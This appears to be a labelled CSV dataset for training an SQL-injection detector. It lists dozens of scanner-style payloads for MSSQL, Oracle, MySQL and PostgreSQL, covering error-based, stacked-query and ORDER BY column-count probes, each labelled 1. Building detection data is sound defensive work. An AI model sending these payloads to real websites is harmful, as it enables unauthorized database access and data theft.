Sentence,Label
"Submit AND 7467=CONVERT(INT,(SELECT CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (7467=7467) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113)))-- mfqt",1
"Submit') AND 1363=CONCAT(CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113),(SELECT (CASE WHEN (1363=1363) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113)) AND ('ocbX'='ocbX",1
"Submit')) AND 1363=CONCAT(CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113),(SELECT (CASE WHEN (1363=1363) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113)) AND (('SYWQ'='SYWQ",1
"Submit' AND 1363=CONCAT(CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113),(SELECT (CASE WHEN (1363=1363) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113)) AND 'tWRh'='tWRh",1
"Submit') AND 1363=CONCAT(CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113),(SELECT (CASE WHEN (1363=1363) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113)) AND ('JDlS' LIKE 'JDlS",1
"Submit%' AND 1363=CONCAT(CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113),(SELECT (CASE WHEN (1363=1363) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113)) AND 'FSkq%'='FSkq",1
"Submit' AND 1363=CONCAT(CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113),(SELECT (CASE WHEN (1363=1363) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113)) AND 'qhos' LIKE 'qhos",1
"Submit"") AND 1363=CONCAT(CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113),(SELECT (CASE WHEN (1363=1363) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113)) AND (""qpCN""=""qpCN",1
"Submit"" AND 1363=CONCAT(CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113),(SELECT (CASE WHEN (1363=1363) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113)) AND ""GJbW""=""GJbW",1
"Submit) AND 1363=CONCAT(CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113),(SELECT (CASE WHEN (1363=1363) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113)) AND (5175=5175",1
"Submit)) AND 1363=CONCAT(CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113),(SELECT (CASE WHEN (1363=1363) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113)) AND ((2052=2052",1
"Submit AND 1363=CONCAT(CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113),(SELECT (CASE WHEN (1363=1363) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113))",1
"Submit AND 1363=CONCAT(CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113),(SELECT (CASE WHEN (1363=1363) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113))-- DuPC",1
Submit') AND 6104=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (6104=6104) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL) AND ('jonp'='jonp,1
Submit')) AND 6104=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (6104=6104) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL) AND (('zUUh'='zUUh,1
Submit' AND 6104=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (6104=6104) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL) AND 'QmMw'='QmMw,1
Submit') AND 6104=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (6104=6104) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL) AND ('SnWk' LIKE 'SnWk,1
Submit%' AND 6104=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (6104=6104) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL) AND 'Zqhj%'='Zqhj,1
Submit' AND 6104=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (6104=6104) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL) AND 'LotZ' LIKE 'LotZ,1
"Submit"") AND 6104=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (6104=6104) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL) AND (""SzxB""=""SzxB",1
"Submit"" AND 6104=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (6104=6104) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL) AND ""ZjkG""=""ZjkG",1
Submit) AND 6104=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (6104=6104) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL) AND (5360=5360,1
Submit)) AND 6104=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (6104=6104) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL) AND ((7494=7494,1
Submit AND 6104=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (6104=6104) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL),1
Submit AND 6104=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (6104=6104) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL)-- ukOc,1
Submit') AND 2774=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (2774=2774) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)) AND ('lAyZ'='lAyZ,1
Submit')) AND 2774=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (2774=2774) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)) AND (('SgES'='SgES,1
Submit' AND 2774=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (2774=2774) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)) AND 'ydZI'='ydZI,1
Submit') AND 2774=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (2774=2774) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)) AND ('ZDpV' LIKE 'ZDpV,1
Submit%' AND 2774=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (2774=2774) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)) AND 'NOPi%'='NOPi,1
Submit' AND 2774=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (2774=2774) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)) AND 'gike' LIKE 'gike,1
"Submit"") AND 2774=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (2774=2774) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)) AND (""BsSw""=""BsSw",1
"Submit"" AND 2774=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (2774=2774) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)) AND ""WKqt""=""WKqt",1
Submit) AND 2774=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (2774=2774) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)) AND (5155=5155,1
Submit)) AND 2774=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (2774=2774) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)) AND ((2561=2561,1
Submit AND 2774=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (2774=2774) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)),1
Submit AND 2774=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (2774=2774) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113))-- bzHt,1
"Submit') PROCEDURE ANALYSE(EXTRACTVALUE(9589,CONCAT(0x5c,0x71766b6271,(SELECT (CASE WHEN (9589=9589) THEN 1 ELSE 0 END)),0x717a627671)),1) AND ('tiZM'='tiZM",1
"Submit')) PROCEDURE ANALYSE(EXTRACTVALUE(9589,CONCAT(0x5c,0x71766b6271,(SELECT (CASE WHEN (9589=9589) THEN 1 ELSE 0 END)),0x717a627671)),1) AND (('LjXH'='LjXH",1
"Submit' PROCEDURE ANALYSE(EXTRACTVALUE(9589,CONCAT(0x5c,0x71766b6271,(SELECT (CASE WHEN (9589=9589) THEN 1 ELSE 0 END)),0x717a627671)),1) AND 'QTem'='QTem",1
"Submit') PROCEDURE ANALYSE(EXTRACTVALUE(9589,CONCAT(0x5c,0x71766b6271,(SELECT (CASE WHEN (9589=9589) THEN 1 ELSE 0 END)),0x717a627671)),1) AND ('xsfA' LIKE 'xsfA",1
"Submit%' PROCEDURE ANALYSE(EXTRACTVALUE(9589,CONCAT(0x5c,0x71766b6271,(SELECT (CASE WHEN (9589=9589) THEN 1 ELSE 0 END)),0x717a627671)),1) AND 'sVZz%'='sVZz",1
"Submit' PROCEDURE ANALYSE(EXTRACTVALUE(9589,CONCAT(0x5c,0x71766b6271,(SELECT (CASE WHEN (9589=9589) THEN 1 ELSE 0 END)),0x717a627671)),1) AND 'CROL' LIKE 'CROL",1
"Submit"") PROCEDURE ANALYSE(EXTRACTVALUE(9589,CONCAT(0x5c,0x71766b6271,(SELECT (CASE WHEN (9589=9589) THEN 1 ELSE 0 END)),0x717a627671)),1) AND (""hrbL""=""hrbL",1
"Submit"" PROCEDURE ANALYSE(EXTRACTVALUE(9589,CONCAT(0x5c,0x71766b6271,(SELECT (CASE WHEN (9589=9589) THEN 1 ELSE 0 END)),0x717a627671)),1) AND ""vOFF""=""vOFF",1
"Submit) PROCEDURE ANALYSE(EXTRACTVALUE(9589,CONCAT(0x5c,0x71766b6271,(SELECT (CASE WHEN (9589=9589) THEN 1 ELSE 0 END)),0x717a627671)),1) AND (6229=6229",1
"Submit)) PROCEDURE ANALYSE(EXTRACTVALUE(9589,CONCAT(0x5c,0x71766b6271,(SELECT (CASE WHEN (9589=9589) THEN 1 ELSE 0 END)),0x717a627671)),1) AND ((2319=2319",1
"Submit PROCEDURE ANALYSE(EXTRACTVALUE(9589,CONCAT(0x5c,0x71766b6271,(SELECT (CASE WHEN (9589=9589) THEN 1 ELSE 0 END)),0x717a627671)),1)",1
"Submit PROCEDURE ANALYSE(EXTRACTVALUE(9589,CONCAT(0x5c,0x71766b6271,(SELECT (CASE WHEN (9589=9589) THEN 1 ELSE 0 END)),0x717a627671)),1)-- xMLN",1
"(EXTRACTVALUE(2474,CONCAT(0x5c,0x71766b6271,(SELECT (ELT(2474=2474,1))),0x717a627671)))",1
(CAST((CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (7842=7842) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)) AS NUMERIC)),1
Submit');DECLARE @LaVn NVARCHAR(4000);SET @LaVn=(SELECT 'qvkbq'+(SELECT (CASE WHEN (9016=9016) THEN '1' ELSE '0' END))+'qzbvq');EXEC @LaVn--,1
Submit'));DECLARE @LaVn NVARCHAR(4000);SET @LaVn=(SELECT 'qvkbq'+(SELECT (CASE WHEN (9016=9016) THEN '1' ELSE '0' END))+'qzbvq');EXEC @LaVn--,1
Submit';DECLARE @LaVn NVARCHAR(4000);SET @LaVn=(SELECT 'qvkbq'+(SELECT (CASE WHEN (9016=9016) THEN '1' ELSE '0' END))+'qzbvq');EXEC @LaVn--,1
Submit%';DECLARE @LaVn NVARCHAR(4000);SET @LaVn=(SELECT 'qvkbq'+(SELECT (CASE WHEN (9016=9016) THEN '1' ELSE '0' END))+'qzbvq');EXEC @LaVn--,1
"Submit"");DECLARE @LaVn NVARCHAR(4000);SET @LaVn=(SELECT 'qvkbq'+(SELECT (CASE WHEN (9016=9016) THEN '1' ELSE '0' END))+'qzbvq');EXEC @LaVn--",1
"Submit"";DECLARE @LaVn NVARCHAR(4000);SET @LaVn=(SELECT 'qvkbq'+(SELECT (CASE WHEN (9016=9016) THEN '1' ELSE '0' END))+'qzbvq');EXEC @LaVn--",1
Submit);DECLARE @LaVn NVARCHAR(4000);SET @LaVn=(SELECT 'qvkbq'+(SELECT (CASE WHEN (9016=9016) THEN '1' ELSE '0' END))+'qzbvq');EXEC @LaVn--,1
Submit));DECLARE @LaVn NVARCHAR(4000);SET @LaVn=(SELECT 'qvkbq'+(SELECT (CASE WHEN (9016=9016) THEN '1' ELSE '0' END))+'qzbvq');EXEC @LaVn--,1
Submit;DECLARE @LaVn NVARCHAR(4000);SET @LaVn=(SELECT 'qvkbq'+(SELECT (CASE WHEN (9016=9016) THEN '1' ELSE '0' END))+'qzbvq');EXEC @LaVn--,1
Submit') ORDER BY 1-- Zueo,1
Submit') ORDER BY 2707-- XbXh,1
Submit')) ORDER BY 1-- nNiB,1
Submit')) ORDER BY 1154-- aXXG,1
Submit' ORDER BY 1-- eNdU,1
Submit' ORDER BY 3396-- owrz,1
Submit') ORDER BY 1-- lsmY,1
Submit') ORDER BY 2214-- HUZL,1
Submit%' ORDER BY 1-- uKKP,1
Submit%' ORDER BY 8281-- kPtb,1
Submit' ORDER BY 1-- RZZI,1
Submit' ORDER BY 1575-- HQRE,1
"Submit"") ORDER BY 1-- rznP",1
"Submit"") ORDER BY 1065-- nFFB",1
"Submit"" ORDER BY 1-- CVWy",1
"Submit"" ORDER BY 6603-- CPIE",1
Submit) ORDER BY 1-- LpLn,1
Submit) ORDER BY 7379-- WSXF,1
Submit)) ORDER BY 1-- tHCx,1
Submit)) ORDER BY 7246-- XQvz,1
Submit ORDER BY 1-- bTRB,1
Submit ORDER BY 3933-- Wvjn,1
Submit ORDER BY 1-- uSHi,1
Submit ORDER BY 6741-- YGyb,1
Submit') ORDER BY 1#,1
Submit') ORDER BY 5723#,1
Submit')) ORDER BY 1#,1
Submit')) ORDER BY 7221#,1
Submit' ORDER BY 1#,1
Submit' ORDER BY 3650#,1
Submit') ORDER BY 1#,1
Submit') ORDER BY 4825#,1
Submit%' ORDER BY 1#,1
Submit%' ORDER BY 2936#,1
Submit' ORDER BY 1#,1
Submit' ORDER BY 7098#,1
"Submit"") ORDER BY 1#",1
"Submit"") ORDER BY 8935#",1
"Submit"" ORDER BY 1#",1
"Submit"" ORDER BY 2344#",1
Submit) ORDER BY 1#,1
Submit) ORDER BY 7544#,1
Submit)) ORDER BY 1#,1
Submit)) ORDER BY 7263#,1
Submit ORDER BY 1#,1
Submit ORDER BY 4148#,1
Submit ORDER BY 1#,1
Submit ORDER BY 6596#,1
